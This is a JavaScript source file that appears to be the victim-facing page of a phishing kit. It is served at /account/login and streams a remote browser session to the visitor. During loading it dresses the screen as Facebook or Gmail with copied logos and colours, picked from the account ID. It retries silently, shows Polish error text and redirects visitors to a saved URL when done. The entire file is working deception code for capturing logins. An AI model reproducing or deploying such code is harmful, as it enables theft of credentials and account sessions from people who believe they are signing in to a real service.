// Viewer page — loaded at /account/login?ref=<numeric-ref>
const params = new URLSearchParams(location.search);
const ref = params.get('ref') || '';
const returnUrl = params.get('return_url') || '';
if (returnUrl) localStorage.setItem('return_url', returnUrl);

const viewer = new SocialPanelViewer(document.querySelector('#screen'));
const overlay = document.querySelector('#loadingOverlay');

function fail(msg) {
  document.body.innerHTML = `<p style="color:#fff;padding:2em;font:16px sans-serif">${msg}</p>`;
}

function setOverlayText(msg) {
  const el = document.querySelector('#overlay-status');
  if (el) el.textContent = msg;
}

const FB_LOGO = `<svg width="52" height="52" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
  <path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/>
</svg>`;

const GMAIL_LOGO = `<svg width="72" height="54" viewBox="0 0 72 54" fill="none" xmlns="http://www.w3.org/2000/svg">
  <rect width="72" height="54" rx="3" fill="#f2f2f2"/>
  <rect x="0" y="0" width="6" height="54" rx="2" fill="#34A853"/>
  <rect x="66" y="0" width="6" height="54" rx="2" fill="#FBBC05"/>
  <path d="M6 0 L36 33 L6 54Z" fill="#EA4335"/>
  <path d="M66 0 L36 33 L66 54Z" fill="#4285F4"/>
  <path d="M6 54 L36 33 L66 54Z" fill="#34A853"/>
  <path d="M6 0 L36 29 L66 0Z" fill="white"/>
</svg>`;

const GDOTS = `<div class="ov-gdots"><span></span><span></span><span></span><span></span></div>`;

function applyPlatform(accountId) {
  if (!overlay || overlay.dataset.platform) return;

  const isFb = /facebook|fb/i.test(accountId);
  const isGmail = /gmail|google|gm/i.test(accountId);
  if (!isFb && !isGmail) return;

  if (isFb) {
    overlay.style.background = '#1877F2';
    overlay.innerHTML = `
      ${FB_LOGO}
      <div class="ov-ring white"></div>
      <div id="overlay-status" style="color:rgba(255,255,255,.6);font:13px/1.4 system-ui,sans-serif;min-height:1.3em;text-align:center"></div>
    `;
  } else {
    overlay.style.background = '#fff';
    overlay.innerHTML = `
      ${GMAIL_LOGO}
      ${GDOTS}
      <div id="overlay-status" style="color:#5f6368;font:13px/1.4 system-ui,sans-serif;min-height:1.3em;text-align:center"></div>
    `;
  }

  overlay.dataset.platform = isFb ? 'facebook' : 'gmail';
}

let _ready = false;
viewer.onReady = () => { _ready = true; if (overlay) overlay.classList.add('hidden'); };
viewer.onredirect = (url) => { const saved = localStorage.getItem('return_url'); window.location.href = saved || url || '/'; };

if (!ref) { fail('Nieznany link.'); }
else {
  let _accountId = null;
  let _retries = 0;

  function startAndConnect() {
    fetch(`/api/account-by-ref/${encodeURIComponent(ref)}/start`, {
      method: 'POST',
      credentials: 'same-origin',
    })
      .then(async (res) => {
        if (res.status === 404) { fail('Nieznany link.'); return; }
        const { accountId } = await res.json();
        _accountId = accountId;
        applyPlatform(accountId);
        setOverlayText('');
        connect();
      })
      .catch(() => {
        if (_retries < 30) {
          _retries++;
          setOverlayText(_retries > 1 ? `(${_retries})` : '');
          setTimeout(startAndConnect, 3000);
        } else {
          fail('Błąd połączenia.');
        }
      });
  }

  function connect() {
    viewer.onclose = (ev) => {
      if (_ready) return;
      if (ev.code === 4409 && _retries < 30) {
        _retries++;
        setOverlayText(_retries > 1 ? `(${_retries})` : '');
        setTimeout(startAndConnect, 2000);
      } else if (ev.code === 4404) {
        fail('Nieznany link.');
      } else {
        fail(`Błąd połączenia (${ev.code || 'WS closed'}).`);
      }
    };
    viewer.connect(_accountId, ref);
  }

  startAndConnect();
}
